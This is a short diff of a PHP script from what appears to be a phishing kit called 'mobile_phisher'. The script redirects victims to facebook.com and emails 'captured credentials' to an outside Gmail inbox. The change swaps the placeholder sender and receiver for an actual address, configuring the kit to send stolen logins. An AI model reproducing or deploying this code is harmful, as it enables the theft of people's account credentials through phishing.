@@ -11,8 +11,8 @@ if($myFile == $searchString) {
 if($myFile != $searchString) {
     header('Location: https://facebook.com/');
 }
-$headers = "From: (any valid email address)";
-$to = "(valid receiver's Gmail )";
+$headers = "From: (sf044799@gmail.com)";
+$to = "(sf044799@gmail.com )";
 $txt ="mobile_phisher Captured These Credentials
 
 Email :- $var
